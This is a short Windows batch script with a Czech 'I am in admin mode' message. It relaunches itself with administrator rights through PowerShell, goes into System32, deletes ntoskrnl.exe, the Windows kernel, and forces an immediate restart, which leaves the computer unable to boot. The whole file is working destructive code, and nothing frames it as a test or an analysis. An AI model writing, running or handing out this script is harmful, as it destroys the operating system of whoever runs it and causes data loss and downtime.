@echo off
cd /d %USERPROFILE%
cd ..
cd ..
cd Windows
cd System32

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo Jsem v admin rezimu
pause

del ntoskrnl.exe

shutdown /r /t 0
